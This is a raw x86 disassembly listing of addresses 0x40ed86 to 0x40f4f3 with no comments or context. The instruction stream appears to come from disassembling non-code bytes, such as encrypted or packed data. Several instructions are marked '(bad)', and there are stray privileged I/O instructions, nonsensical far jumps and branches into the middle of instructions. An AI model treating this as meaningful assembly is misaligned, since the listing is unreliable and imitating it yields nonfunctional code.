  40ed86:	cdq    
  40ed87:	sub    eax,0x85294418
  40ed8c:	jecxz  0x40edb9
  40ed8e:	loopne 0x40edc9
  40ed90:	jbe    0x40ee0b
  40ed92:	cmp    BYTE PTR [edi+0x68],0xf8
  40ed96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed97:	inc    esi
  40ed98:	in     al,0x5
  40ed9a:	hlt    
  40ed9b:	dec    edi
  40ed9c:	mov    dl,0x69
  40ed9e:	dec    esp
  40ed9f:	(bad)  
  40eda0:	jns    0x40ed2b
  40eda2:	in     eax,0x50
  40eda4:	mov    bh,0xd8
  40eda6:	push   ds
  40eda7:	cmc    
  40eda8:	enter  0x51de,0x2c
  40edac:	retf   
  40edad:	cld    
  40edae:	adc    esp,0x73
  40edb1:	xor    esi,esi
  40edb3:	add    cl,ah
  40edb5:	ds repnz iret 
  40edb8:	sub    al,0x7b
  40edba:	mov    WORD PTR [eax+0x3bf7c6b9],es
  40edc0:	sub    DWORD PTR [ecx+0x70],esp
  40edc3:	dec    esi
  40edc4:	rol    esp,1
  40edc6:	adc    edi,ebp
  40edc8:	sub    dl,BYTE PTR [edx+0x54a53bbb]
  40edce:	ss call 0xf90c:0x5748ab19
  40edd6:	jg     0x40edd2
  40edd8:	add    DWORD PTR [ecx-0x4a],esi
  40eddb:	iret   
  40eddc:	xor    DWORD PTR [ebx-0x5c],0x6e
  40ede0:	aaa    
  40ede1:	mov    esp,0x66646c05
  40ede6:	and    al,0xa5
  40ede8:	xchg   edi,eax
  40ede9:	push   ss
  40edea:	push   es
  40edeb:	loop   0x40ee41
  40eded:	pop    edi
  40edee:	jge    0x40ee38
  40edf0:	push   esi
  40edf1:	das    
  40edf2:	lahf   
  40edf3:	jbe    0x40ee0b
  40edf5:	or     eax,0xf8ac67bc
  40edfa:	mov    edi,0xa6f3f82f
  40edff:	pop    edx
  40ee00:	pushf  
  40ee01:	hlt    
  40ee02:	out    0x2,al
  40ee04:	add    BYTE PTR [esp+edx*8-0x56],cl
  40ee08:	mov    edi,0x56038079
  40ee0d:	inc    edi
  40ee0e:	mov    dl,0x55
  40ee10:	cmp    eax,0x647eb2f
  40ee15:	mov    ebx,gs
  40ee17:	cdq    
  40ee18:	xor    edx,DWORD PTR [esi+edx*4+0x42]
  40ee1c:	test   DWORD PTR [edx+0x5a85c6f6],edi
  40ee22:	sahf   
  40ee23:	mov    WORD PTR [ecx-0x60],gs
  40ee26:	or     eax,0x5cb123cf
  40ee2b:	std    
  40ee2c:	add    DWORD PTR [esi-0x33],edi
  40ee2f:	nop
  40ee30:	std    
  40ee31:	cli    
  40ee32:	es fs cmp ch,0xaa
  40ee37:	dec    ebx
  40ee38:	fstp   DWORD PTR [esi+ecx*2-0xa658297]
  40ee3f:	loopne 0x40ee97
  40ee41:	out    dx,al
  40ee42:	jmp    0x40ee2a
  40ee44:	or     edi,esp
  40ee46:	mov    edx,0x595e8805
  40ee4b:	jmp    0x40eeb9
  40ee4d:	dec    ebx
  40ee4e:	ins    BYTE PTR es:[edi],dx
  40ee4f:	push   ebx
  40ee50:	xor    DWORD PTR [edx],eax
  40ee52:	test   eax,0xa5332e4e
  40ee57:	clc    
  40ee58:	repnz stos BYTE PTR es:[edi],al
  40ee5a:	push   ss
  40ee5b:	jecxz  0x40ee7b
  40ee5d:	jle    0x40eebb
  40ee5f:	fwait
  40ee60:	adc    eax,0x7f9909a5
  40ee65:	daa    
  40ee66:	sti    
  40ee67:	scas   eax,DWORD PTR es:[edi]
  40ee68:	stos   BYTE PTR es:[edi],al
  40ee69:	inc    esp
  40ee6a:	div    esi
  40ee6c:	test   cl,0xae
  40ee6f:	idiv   DWORD PTR [ebx+ecx*1+0x76]
  40ee73:	xlat   BYTE PTR ds:[ebx]
  40ee74:	adc    al,0xb2
  40ee76:	jl     0x40ee94
  40ee78:	or     edi,DWORD PTR [esi-0x61c254eb]
  40ee7e:	scas   eax,DWORD PTR es:[edi]
  40ee7f:	pop    es
  40ee80:	pop    edi
  40ee81:	push   eax
  40ee82:	mov    ch,BYTE PTR [esi+0x31185709]
  40ee88:	pop    esi
  40ee89:	pop    ecx
  40ee8a:	out    dx,eax
  40ee8b:	and    BYTE PTR [eax-0x4cda8ce1],0x36
  40ee92:	popf   
  40ee93:	ss stc 
  40ee95:	aaa    
  40ee96:	aam    0xdc
  40ee98:	cmp    bl,al
  40ee9a:	xor    esi,DWORD PTR [edi+eiz*2+0x2af238b3]
  40eea1:	sub    eax,0x79ef9c58
  40eea6:	les    esi,FWORD PTR [edx-0x47]
  40eea9:	cmp    eax,esi
  40eeab:	sar    BYTE PTR [edi-0x2f98646c],cl
  40eeb1:	fdiv   QWORD PTR [ebp-0x3f0be32b]
  40eeb7:	adc    eax,0x8ad7f820
  40eebc:	ret    0x4b61
  40eebf:	and    al,0xda
  40eec1:	mov    ebx,0xa1cb9bb8
  40eec6:	jnp    0x40eecf
  40eec8:	sub    dh,al
  40eeca:	sbb    bl,0x19
  40eecd:	out    dx,al
  40eece:	aaa    
  40eecf:	and    dl,BYTE PTR [esi+0x69]
  40eed2:	push   ds
  40eed3:	mov    esp,0xd7a81462
  40eed8:	inc    edx
  40eed9:	inc    ebp
  40eeda:	jo     0x40eeb8
  40eedc:	outs   dx,DWORD PTR ds:[esi]
  40eedd:	int3   
  40eede:	cmp    al,0x46
  40eee0:	dec    BYTE PTR [edx+0x22]
  40eee3:	in     al,0xe0
  40eee5:	push   0x832ade5a
  40eeea:	lods   eax,DWORD PTR ds:[esi]
  40eeeb:	(bad)  
  40eeec:	and    eax,0xbde25637
  40eef1:	xor    al,0xf4
  40eef3:	xchg   DWORD PTR [ebx],ebx
  40eef5:	retf   0xc57f
  40eef8:	and    al,0xce
  40eefa:	shl    esp,cl
  40eefc:	sub    BYTE PTR [ebp-0x22cb734],dl
  40ef02:	xor    BYTE PTR [ebx],bh
  40ef04:	ja     0x40eefe
  40ef06:	retf   
  40ef07:	or     BYTE PTR [edx+0x354a9e2f],ah
  40ef0d:	and    BYTE PTR [ecx],0xe0
  40ef10:	frstpm(287 only) 
  40ef12:	pop    ss
  40ef13:	out    0x3,al
  40ef15:	fst    QWORD PTR [eax+0x24ab112b]
  40ef1b:	lea    ebx,[esi-0x66]
  40ef1e:	mov    es,WORD PTR [ecx-0x36]
  40ef21:	imul   esi,DWORD PTR [ecx-0x30ee7e3c],0xbf306661
  40ef2b:	xchg   DWORD PTR ds:0xf330849,ebp
  40ef31:	cmp    al,0xb2
  40ef33:	add    cl,BYTE PTR ss:[ecx+edx*4]
  40ef37:	jns    0x40efb1
  40ef39:	sbb    bh,BYTE PTR [ecx]
  40ef3b:	into   
  40ef3c:	xor    eax,0x378ece9a
  40ef41:	xor    al,0xd9
  40ef43:	xor    al,BYTE PTR [ecx+0x4d]
  40ef46:	sbb    al,0x46
  40ef48:	ins    DWORD PTR es:[edi],dx
  40ef49:	xor    ah,BYTE PTR [eax]
  40ef4b:	adc    ebp,DWORD PTR [ebx+0x3c]
  40ef4e:	or     DWORD PTR [edx+edx*1+0x51],ebp
  40ef52:	push   ebx
  40ef53:	jp     0x40ef64
  40ef55:	scas   al,BYTE PTR es:[edi]
  40ef56:	inc    esp
  40ef57:	dec    ebp
  40ef58:	pushf  
  40ef59:	push   0xffffffd6
  40ef5b:	and    esp,edx
  40ef5d:	loope  0x40efac
  40ef5f:	call   0xa5b:0x92b920d
  40ef66:	jbe    0x40ef82
  40ef68:	pop    ecx
  40ef69:	or     al,bh
  40ef6b:	outs   dx,DWORD PTR ds:[esi]
  40ef6c:	add    al,0x99
  40ef6e:	pop    ebp
  40ef6f:	adc    DWORD PTR [edx-0x6a],esi
  40ef72:	repnz inc esi
  40ef74:	sar    BYTE PTR [ebp-0x7c],1
  40ef77:	and    DWORD PTR [edi-0x58],eax
  40ef7a:	scas   al,BYTE PTR es:[edi]
  40ef7b:	adc    BYTE PTR [esi-0x1c],dl
  40ef7e:	ins    DWORD PTR es:[edi],dx
  40ef7f:	add    ebp,DWORD PTR [ebp+0x1d2230ab]
  40ef85:	mov    al,ds:0xea1d8a4c
  40ef8a:	pop    esp
  40ef8b:	push   es
  40ef8c:	lds    ebx,FWORD PTR [esi+0x2]
  40ef8f:	pop    esi
  40ef90:	xchg   BYTE PTR [edi-0xb],bh
  40ef93:	cmp    eax,0x5adf8bbf
  40ef98:	cmp    cl,ah
  40ef9a:	mov    eax,0x3649a8ee
  40ef9f:	sti    
  40efa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efa1:	outs   dx,DWORD PTR ds:[esi]
  40efa2:	mov    ds:0x61a559ab,al
  40efa7:	fsub   st(0),st
  40efa9:	jmp    0xe9015763
  40efae:	add    BYTE PTR [edx-0x7bdfeea1],ah
  40efb4:	mov    gs,WORD PTR [esi+0x6d]
  40efb7:	add    al,0x55
  40efb9:	ret    0xda4f
  40efbc:	fsubr  QWORD PTR [eax]
  40efbe:	push   eax
  40efbf:	inc    edx
  40efc0:	and    cl,BYTE PTR [eax-0x7c]
  40efc3:	pop    eax
  40efc4:	inc    ebp
  40efc5:	test   esi,edi
  40efc7:	rol    BYTE PTR [esi],cl
  40efc9:	mov    dl,0x37
  40efcb:	inc    edx
  40efcc:	test   BYTE PTR [ebp-0x5a],0x91
  40efd0:	add    ah,BYTE PTR [esi+0x1e84d215]
  40efd6:	inc    edx
  40efd7:	xchg   esi,eax
  40efd8:	mov    ah,0xb0
  40efda:	pop    ds
  40efdb:	retf   0xa9eb
  40efde:	repnz cmc 
  40efe0:	emms   
  40efe2:	mov    ds:0x7ebc2290,eax
  40efe7:	ins    DWORD PTR es:[edi],dx
  40efe8:	cmp    al,bh
  40efea:	test   DWORD PTR [eax],0x53bf884e
  40eff0:	jo     0x40ef89
  40eff2:	into   
  40eff3:	xchg   edx,eax
  40eff4:	jnp    0x40f018
  40eff6:	push   esp
  40eff7:	xlat   BYTE PTR ds:[ebx]
  40eff8:	scas   eax,DWORD PTR es:[edi]
  40eff9:	mov    ds:0xc21039fe,al
  40effe:	cmc    
  40efff:	shr    ah,cl
  40f001:	adc    ebp,DWORD PTR [esi]
  40f003:	loop   0x40f03b
  40f005:	sti    
  40f006:	mov    ds:0xd26c3368,eax
  40f00b:	push   ebx
  40f00c:	lods   al,BYTE PTR ds:[esi]
  40f00d:	ret    0x4069
  40f010:	push   edi
  40f011:	xor    BYTE PTR [eax-0x497def4a],cl
  40f017:	repnz inc edi
  40f019:	or     ebp,ecx
  40f01b:	xchg   ebp,edi
  40f01d:	or     ecx,DWORD PTR [ebp+0x496507e8]
  40f023:	sti    
  40f024:	(bad)  
  40f025:	test   al,0x78
  40f027:	mov    dl,0xc4
  40f029:	sbb    BYTE PTR [eax+0x37],ch
  40f02c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f02d:	mov    cl,0xc6
  40f02f:	out    dx,eax
  40f030:	cmp    al,0x34
  40f032:	js     0x40efc8
  40f034:	fld    QWORD PTR [ebx+0x60901efe]
  40f03a:	cmp    ecx,edx
  40f03c:	nop
  40f03d:	xchg   DWORD PTR [ecx],esp
  40f03f:	call   0xec8f83d8
  40f044:	je     0x40f062
  40f046:	gs push esp
  40f048:	leave  
  40f049:	imul   eax,DWORD PTR [eax-0x668e9355],0xc66f1a1d
  40f053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f054:	or     esp,esi
  40f056:	shl    BYTE PTR [edi+edi*1],cl
  40f059:	out    0x91,eax
  40f05b:	add    edi,esp
  40f05d:	cs popa 
  40f05f:	lods   al,BYTE PTR ds:[esi]
  40f060:	or     DWORD PTR [edx-0x3f8d6156],ecx
  40f066:	push   edx
  40f067:	or     esi,DWORD PTR [esi-0x34deba87]
  40f06d:	inc    edi
  40f06e:	daa    
  40f06f:	xchg   esi,eax
  40f070:	push   edi
  40f071:	jae    0x40f022
  40f073:	pop    edi
  40f074:	jge    0x40f0d6
  40f076:	fs ss inc esp
  40f079:	out    dx,al
  40f07a:	cmp    al,0x28
  40f07c:	adc    ah,dl
  40f07e:	fisubr DWORD PTR [esi+ebp*2-0x29daa58f]
  40f085:	sub    DWORD PTR [ebx-0x24],ecx
  40f088:	out    0xb3,al
  40f08a:	mov    edi,0xf250640a
  40f08f:	je     0x40f108
  40f091:	mov    eax,0x524f018a
  40f096:	mov    eax,0xc9056447
  40f09b:	mov    esp,0x3c3c3ae3
  40f0a0:	or     al,0x31
  40f0a2:	test   eax,0x883996af
  40f0a7:	and    ebx,edx
  40f0a9:	test   al,0xe9
  40f0ab:	mov    ch,0x4b
  40f0ad:	push   0xffffffc1
  40f0af:	xchg   DWORD PTR [ebx+0x110ed0b1],esi
  40f0b5:	push   eax
  40f0b6:	push   edx
  40f0b7:	test   eax,0x7aa1b41
  40f0bc:	rcl    BYTE PTR cs:[edx],0xb1
  40f0c0:	icebp  
  40f0c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0c2:	popa   
  40f0c3:	dec    ebp
  40f0c4:	sbb    al,0x8c
  40f0c6:	rcr    DWORD PTR [ebp+0x30],0x79
  40f0ca:	outs   dx,DWORD PTR ds:[esi]
  40f0cb:	sbb    eax,0x211a6060
  40f0d0:	dec    esi
  40f0d1:	fdivp  st(1),st
  40f0d3:	rol    cl,0x22
  40f0d6:	pop    ss
  40f0d7:	or     BYTE PTR [eax+0x529c1c4],dl
  40f0dd:	and    eax,0x8833bbad
  40f0e2:	loopne 0x40f15b
  40f0e4:	sti    
  40f0e5:	ds push ss
  40f0e7:	mov    ah,0xd5
  40f0e9:	jp     0x40f0b5
  40f0eb:	in     eax,dx
  40f0ec:	xor    eax,0xf11fccff
  40f0f1:	add    al,0x48
  40f0f3:	jb     0x40f160
  40f0f5:	in     al,0xf
  40f0f7:	(bad)  
  40f0f8:	pop    ds
  40f0f9:	iret   
  40f0fa:	fdivr  QWORD PTR [edx+0x23d26d59]
  40f100:	jge    0x40f130
  40f102:	xchg   ebp,eax
  40f103:	idiv   DWORD PTR ds:0x445f6ae2
  40f109:	jno    0x40f18a
  40f10b:	inc    ebx
  40f10c:	sahf   
  40f10d:	xor    al,0xdb
  40f10f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f110:	xlat   BYTE PTR ds:[ebx]
  40f111:	mov    ebx,0x75e588a2
  40f116:	das    
  40f117:	fs mov bl,0xe
  40f11a:	repz or ecx,DWORD PTR [esi+0x3d]
  40f11e:	xchg   edi,eax
  40f11f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40f121:	fistp  WORD PTR [esi-0xf]
  40f124:	sbb    eax,0x1922d14d
  40f129:	aad    0x9f
  40f12b:	sbb    al,0xbe
  40f12d:	adc    DWORD PTR es:[esi],0x1ce1317d
  40f134:	jmp    0xedb0:0xce55c06b
  40f13b:	mov    dh,0xab
  40f13d:	test   eax,0xbbad8fb4
  40f142:	jnp    0x40f148
  40f144:	lods   al,BYTE PTR ds:[esi]
  40f145:	mov    eax,ds:0x710eb063
  40f14a:	push   edx
  40f14b:	jmp    0x33cb:0xec287824
  40f152:	push   cs
  40f153:	hlt    
  40f154:	sbb    al,0x7c
  40f156:	or     bl,ah
  40f158:	aaa    
  40f159:	xchg   esi,eax
  40f15a:	xlat   BYTE PTR ds:[ebx]
  40f15b:	icebp  
  40f15c:	in     al,dx
  40f15d:	inc    edx
  40f15e:	xor    al,0xed
  40f160:	adc    edx,DWORD PTR [eax-0x1b]
  40f163:	pop    esi
  40f164:	xor    bh,BYTE PTR [esi+0x108e1e45]
  40f16a:	mov    ah,0x6e
  40f16c:	sbb    eax,0xc16a958f
  40f171:	adc    BYTE PTR [esi-0x1],bl
  40f174:	out    dx,al
  40f175:	mov    dh,0x27
  40f177:	ss adc ebx,esi
  40f17a:	(bad)  
  40f17b:	rcr    BYTE PTR [ecx-0x1b],1
  40f17e:	cdq    
  40f17f:	(bad)  
  40f180:	mov    esp,0xfebbeafd
  40f185:	(bad)  [edx+0x1]
  40f188:	and    DWORD PTR [ebp+0x49],eax
  40f18b:	adc    al,0x45
  40f18d:	in     eax,0x38
  40f18f:	enter  0x62c9,0xd1
  40f193:	jecxz  0x40f1e6
  40f195:	or     BYTE PTR [eax+0xe],0xe4
  40f199:	xlat   BYTE PTR ds:[ebx]
  40f19a:	cs int3 
  40f19c:	or     edi,DWORD PTR [ebx+ecx*1]
  40f19f:	pop    es
  40f1a0:	xor    dl,cl
  40f1a2:	(bad)  
  40f1a3:	cs (bad) 
  40f1a5:	push   0xffffffd9
  40f1a7:	retf   0xf296
  40f1aa:	pop    es
  40f1ab:	jp     0x40f190
  40f1ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ae:	leave  
  40f1af:	or     al,0xf5
  40f1b1:	js     0x40f223
  40f1b3:	into   
  40f1b4:	xchg   edi,eax
  40f1b5:	call   DWORD PTR [eax-0x45]
  40f1b9:	and    DWORD PTR [ecx+0x2a108f1f],esp
  40f1bf:	cwde   
  40f1c0:	and    al,0x98
  40f1c2:	jmp    0x9085:0xe0358beb
  40f1c9:	inc    ecx
  40f1ca:	jbe    0x40f1b6
  40f1cc:	sahf   
  40f1cd:	adc    DWORD PTR [ebx+edi*1],ecx
  40f1d0:	fs popa 
  40f1d2:	imul   ebp,ecx,0x1
  40f1d5:	cmp    ebx,eax
  40f1d7:	adc    eax,0xd09c4aa
  40f1dc:	retf   0x85a8
  40f1df:	sub    al,0x8f
  40f1e1:	push   esp
  40f1e2:	rol    DWORD PTR [ebp-0x6b0024d9],cl
  40f1e8:	cwde   
  40f1e9:	mov    ds:0xfe84f23c,al
  40f1ee:	clc    
  40f1ef:	hlt    
  40f1f0:	inc    esi
  40f1f1:	inc    esi
  40f1f2:	repnz lahf 
  40f1f4:	stos   BYTE PTR es:[edi],al
  40f1f5:	ss data16 sbb cl,ch
  40f1f9:	mov    esi,0x99498ab2
  40f1fe:	mov    eax,0xc60c2184
  40f203:	in     al,0x9a
  40f205:	mov    ds:0xeea70571,eax
  40f20a:	sub    eax,0xaa02abe9
  40f20f:	pop    edi
  40f210:	ins    BYTE PTR es:[edi],dx
  40f211:	test   eax,0x776c12f8
  40f216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f218:	or     al,BYTE PTR [ebp+ebp*8+0xcc43a14]
  40f21f:	push   edx
  40f220:	mul    ah
  40f222:	or     eax,0xeeb1bd41
  40f227:	xor    al,0xad
  40f229:	fst    DWORD PTR [ebx+0x1ab6ff7]
  40f22f:	popf   
  40f230:	sbb    al,BYTE PTR [edx]
  40f232:	ins    DWORD PTR es:[edi],dx
  40f233:	jp     0x40f26f
  40f235:	add    DWORD PTR [eax+0x3f18653f],0xffffffa4
  40f23c:	xlat   BYTE PTR ds:[ebx]
  40f23d:	aaa    
  40f23e:	cwde   
  40f23f:	std    
  40f240:	test   BYTE PTR [esi],al
  40f242:	add    eax,0x58a02847
  40f247:	pop    es
  40f248:	jo     0x40f1fc
  40f24a:	mov    al,ch
  40f24c:	int3   
  40f24d:	xchg   edx,eax
  40f24e:	rcr    esi,1
  40f250:	jae    0x40f231
  40f252:	cmp    DWORD PTR [esi-0x8],edi
  40f255:	push   0xd258574b
  40f25a:	mov    al,0xe9
  40f25c:	cmp    bh,ch
  40f25e:	std    
  40f25f:	call   0xadbfa41f
  40f264:	push   edx
  40f265:	mov    ebp,0xc86105ee
  40f26a:	cs adc al,ah
  40f26d:	sahf   
  40f26e:	outs   dx,DWORD PTR ds:[esi]
  40f26f:	lea    edx,[edi+0x20aeb23b]
  40f275:	aas    
  40f276:	adc    esi,DWORD PTR [edx-0x80]
  40f279:	or     eax,0xb4619fc9
  40f27e:	(bad)  
  40f27f:	scas   al,BYTE PTR es:[edi]
  40f280:	sbb    al,0x3f
  40f282:	push   ebx
  40f283:	in     al,0xae
  40f285:	xchg   edx,ecx
  40f287:	pop    edi
  40f288:	sub    eax,0x4a24f7ce
  40f28d:	xchg   DWORD PTR [edx-0x11],ecx
  40f290:	add    al,0xa4
  40f292:	aad    0xdd
  40f294:	arpl   WORD PTR [ebx],si
  40f296:	shr    DWORD PTR [esp+ebx*4+0x57],cl
  40f29a:	add    al,0x68
  40f29c:	outs   dx,DWORD PTR ds:[esi]
  40f29d:	test   DWORD PTR [ebx-0x7da676f2],edx
  40f2a3:	mov    ds:0x6b2fc1b3,al
  40f2a8:	jl     0x40f283
  40f2aa:	outs   dx,DWORD PTR ds:[esi]
  40f2ab:	xchg   DWORD PTR [edi],esi
  40f2ad:	jmp    0x40f326
  40f2af:	aam    0xb
  40f2b1:	fwait
  40f2b2:	mov    ds,WORD PTR [eax-0x763be759]
  40f2b8:	and    BYTE PTR [edi],dl
  40f2ba:	mov    edx,0x3e1e6a6b
  40f2bf:	(bad)  
  40f2c0:	mov    bl,0xee
  40f2c2:	loop   0x40f31c
  40f2c4:	xor    al,0x41
  40f2c6:	rcr    DWORD PTR [edx-0x14],1
  40f2c9:	fcmovu st,st(7)
  40f2cb:	cmp    al,dh
  40f2cd:	push   edx
  40f2ce:	dec    esp
  40f2cf:	push   esp
  40f2d0:	sub    dl,BYTE PTR [eax+ebp*1+0x769e0754]
  40f2d7:	xchg   ebp,eax
  40f2d8:	xchg   ecx,eax
  40f2d9:	repz mov al,ds:0xc6b20d36
  40f2df:	mov    BYTE PTR [ebx-0x16],bh
  40f2e2:	jge    0x40f2da
  40f2e4:	pushf  
  40f2e5:	call   0xa6f6c09d
  40f2ea:	or     bl,BYTE PTR [ecx]
  40f2ec:	imul   esi,DWORD PTR [ecx-0x2ed4965],0x22
  40f2f3:	cmc    
  40f2f4:	call   0xd4a8fece
  40f2f9:	scas   al,BYTE PTR es:[edi]
  40f2fa:	shr    ah,1
  40f2fc:	xchg   dh,ch
  40f2fe:	fidiv  DWORD PTR [eax+edi*1-0x21]
  40f302:	mov    al,0x7a
  40f304:	xchg   ebp,eax
  40f305:	ins    DWORD PTR es:[edi],dx
  40f306:	pop    eax
  40f307:	(bad)  
  40f308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f309:	mov    ds:0xcbdafdd7,eax
  40f30e:	or     al,0xc0
  40f310:	pop    eax
  40f311:	into   
  40f312:	mov    eax,0x155f600c
  40f317:	loope  0x40f370
  40f319:	aad    0x2d
  40f31b:	jg     0x40f31a
  40f31d:	dec    edx
  40f31e:	pop    es
  40f31f:	push   esp
  40f320:	aad    0xf8
  40f322:	lods   eax,DWORD PTR ds:[esi]
  40f323:	arpl   bp,ax
  40f325:	pop    esi
  40f326:	jns    0x40f30c
  40f328:	xor    al,0x5c
  40f32a:	js     0x40f37e
  40f32c:	fldl2e 
  40f32e:	mov    eax,ds:0xfff266d1
  40f333:	mov    dl,0x16
  40f335:	seta   ah
  40f338:	stos   DWORD PTR es:[edi],eax
  40f339:	(bad)  
  40f33a:	or     bl,bl
  40f33c:	pop    esi
  40f33d:	stos   BYTE PTR es:[edi],al
  40f33e:	mov    DWORD PTR [edi+0x46],ecx
  40f341:	sbb    BYTE PTR [edx-0x52d04fcb],0x5
  40f348:	test   DWORD PTR [esi+0x387adc48],ebx
  40f34e:	cdq    
  40f34f:	shr    cl,0x75
  40f352:	dec    edi
  40f353:	mov    ebx,esi
  40f355:	push   esi
  40f356:	push   cs
  40f357:	aas    
  40f358:	mov    dl,0x1b
  40f35a:	inc    edx
  40f35b:	push   cs
  40f35c:	cmp    ebp,ebp
  40f35e:	es inc edx
  40f360:	scas   eax,DWORD PTR es:[edi]
  40f361:	fstp   DWORD PTR [esi+0x35a7b126]
  40f367:	mov    ecx,0xa1712171
  40f36c:	scas   al,BYTE PTR es:[edi]
  40f36d:	ror    DWORD PTR [bx],0xc5
  40f371:	push   eax
  40f372:	dec    ebp
  40f373:	dec    edi
  40f374:	lods   al,BYTE PTR ds:[esi]
  40f375:	test   eax,0xf7110e84
  40f37a:	fwait
  40f37b:	(bad)  
  40f37d:	mov    dl,0x70
  40f37f:	mov    ah,0xc6
  40f381:	(bad)  
  40f382:	push   0xda82dc2a
  40f387:	dec    ebx
  40f388:	sbb    eax,DWORD PTR [ecx]
  40f38a:	sbb    eax,0x84a9ffde
  40f38f:	loope  0x40f3c8
  40f391:	adc    al,0x17
  40f393:	(bad)  
  40f394:	sub    dl,BYTE PTR [esi+0x7815733e]
  40f39a:	adc    al,0x11
  40f39c:	ja     0x40f39c
  40f39e:	std    
  40f39f:	sbb    eax,0x29286891
  40f3a4:	aam    0x78
  40f3a6:	inc    eax
  40f3a7:	iret   
  40f3a8:	test   DWORD PTR [esi+0x5618d15e],ecx
  40f3ae:	int3   
  40f3af:	nop
  40f3b0:	cmp    eax,0x6326d825
  40f3b5:	ror    DWORD PTR [eax+ebp*8+0x7b5aa9b],1
  40f3bc:	adc    eax,0xaa6a7f1
  40f3c1:	dec    ebp
  40f3c2:	mov    DWORD PTR [edi+0x79],edi
  40f3c5:	dec    ecx
  40f3c6:	loope  0x40f3f2
  40f3c8:	add    al,0x3e
  40f3cb:	jnp    0x40f443
  40f3cd:	rol    DWORD PTR [esi-0x5f],1
  40f3d0:	cmp    eax,0x4ce092a6
  40f3d5:	retf   0x7d2c
  40f3d8:	shr    BYTE PTR [eax-0x1e],0x5d
  40f3dc:	mov    ebp,0x979909a
  40f3e1:	pop    esp
  40f3e2:	inc    edi
  40f3e3:	or     al,0x2d
  40f3e5:	inc    eax
  40f3e6:	xor    BYTE PTR [esi+0x76],al
  40f3e9:	mov    al,ds:0x4ea5dbc
  40f3ee:	xchg   dh,ah
  40f3f0:	mov    esp,edi
  40f3f2:	test   BYTE PTR [ebx],al
  40f3f4:	daa    
  40f3f5:	cli    
  40f3f6:	(bad)  
  40f3f7:	loop   0x40f444
  40f3f9:	mov    eax,0x8c25a95
  40f3fe:	xor    eax,0x364bc352
  40f404:	cld    
  40f405:	fnstcw WORD PTR [esi+ebp*8+0x1b6ff40]
  40f40c:	push   edx
  40f40d:	inc    ebp
  40f40e:	xchg   edi,eax
  40f40f:	dec    cx
  40f411:	push   cs
  40f412:	mov    ds:0x75cf7298,al
  40f417:	sub    ebx,esi
  40f419:	cwde   
  40f41a:	fdiv   QWORD PTR [eax]
  40f41c:	pushf  
  40f41d:	adc    ecx,edx
  40f41f:	ret    0xd8c3
  40f422:	add    eax,0x3244a886
  40f427:	repz or eax,0x9cc6830a
  40f42d:	iret   
  40f42e:	(bad)  
  40f42f:	stos   DWORD PTR es:[edi],eax
  40f430:	dec    eax
  40f431:	or     eax,0x113ce4da
  40f436:	xchg   edi,eax
  40f437:	mov    dh,0xf8
  40f439:	clc    
  40f43a:	jp     0x40f3cf
  40f43c:	lds    edi,FWORD PTR [edi+0x756af815]
  40f442:	(bad)  
  40f443:	jb     0x40f470
  40f445:	xchg   edi,eax
  40f446:	or     DWORD PTR [bp+di-0x95f],esi
  40f44b:	lods   al,BYTE PTR ds:[esi]
  40f44c:	sub    eax,DWORD PTR [esi+0x34]
  40f44f:	dec    ebp
  40f450:	std    
  40f451:	inc    edx
  40f452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f453:	test   eax,0xa29bedbd
  40f458:	lods   eax,DWORD PTR ds:[esi]
  40f459:	gs js  0x40f429
  40f45c:	stc    
  40f45d:	fisubr WORD PTR [eax+0x7c]
  40f460:	enter  0x5da2,0x8a
  40f464:	or     ecx,DWORD PTR [esi]
  40f466:	rol    BYTE PTR [edx],0xae
  40f469:	mov    ds:0xadb257b,al
  40f46e:	cwde   
  40f46f:	cmp    ecx,DWORD PTR [esi]
  40f471:	mov    es,WORD PTR [ecx]
  40f473:	out    dx,al
  40f474:	cmp    ecx,DWORD PTR [edi]
  40f476:	xchg   edx,eax
  40f477:	push   ebp
  40f478:	push   es
  40f479:	dec    ecx
  40f47a:	iret   
  40f47b:	or     BYTE PTR [ecx],bl
  40f47d:	mov    ah,0xbf
  40f47f:	xchg   edi,eax
  40f480:	and    bh,cl
  40f482:	pop    es
  40f483:	inc    ecx
  40f484:	sub    BYTE PTR [ecx+0x3817d44e],bl
  40f48a:	or     BYTE PTR [edi],cl
  40f48c:	or     edi,DWORD PTR fs:[esi-0x14]
  40f490:	jne    0x40f4f1
  40f492:	mov    esp,edx
  40f494:	dec    esp
  40f495:	sbb    ecx,DWORD PTR [edi+ecx*2+0x71]
  40f499:	push   ss
  40f49a:	xchg   edx,eax
  40f49b:	sbb    al,0x4b
  40f49d:	cld    
  40f49e:	pusha  
  40f49f:	call   0x8cf7:0x4223465e
  40f4a6:	fcomp  DWORD PTR [esi]
  40f4a8:	jo     0x40f458
  40f4aa:	mov    eax,0x5c2b9677
  40f4af:	out    dx,eax
  40f4b0:	cmp    eax,0x4aa994ca
  40f4b5:	push   ebp
  40f4b6:	out    0x59,eax
  40f4b8:	imul   esi,DWORD PTR [ecx-0x6dbee374],0x4e1a043
  40f4c2:	cmp    BYTE PTR [edi],0xc3
  40f4c5:	repz sbb esp,DWORD PTR ds:0x72f5202d
  40f4cc:	ja     0x40f471
  40f4ce:	dec    edx
  40f4cf:	mov    ch,0xe2
  40f4d1:	jmp    0x40f528
  40f4d3:	test   DWORD PTR [edi+0x27e5220],edi
  40f4d9:	aaa    
  40f4da:	test   eax,0x20ea3d9a
  40f4df:	daa    
  40f4e0:	push   cs
  40f4e1:	nop
  40f4e2:	fild   DWORD PTR [edi-0x3b]
  40f4e5:	out    0x25,al
  40f4e7:	add    dh,BYTE PTR [edi]
  40f4e9:	ss pop esi
  40f4eb:	mov    eax,ds:0x5002f12
  40f4f0:	pop    edx
  40f4f1:	pop    esp
  40f4f2:	pop    edi
  40f4f3:	call   0x275a84ad
